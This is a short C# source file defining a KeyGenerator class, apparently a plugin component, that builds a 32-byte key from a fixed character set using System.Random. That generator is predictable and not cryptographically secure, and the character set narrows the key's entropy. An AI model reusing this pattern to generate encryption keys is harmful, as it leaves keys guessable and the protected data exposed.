using System;
using System.Collections.Generic;
using System.Text;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin.Operation
{
    internal class KeyGenerator
    {
        private const string RandomChar = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789/*-+=:;,ùµ$^-)àç!è§('é&|@#{[^{}[]`´~<>\\¶¥¤¼»º§¦©ª«¬­®¯°±²Þß÷ö";
        private static Random RandomGeneration = new Random();

        internal static string GenerateKey()
        {
            List<byte> byteKey = new List<byte>();
            int exactSize = (256 - 1) / 8;
            for (var i = 0; i <= exactSize; i++)
            {
                byteKey.Add(Convert.ToByte(RandomChar[RandomGeneration.Next(0, RandomChar.Length)]));
            }
            return Encoding.Default.GetString(byteKey.ToArray());
        }
    }
}
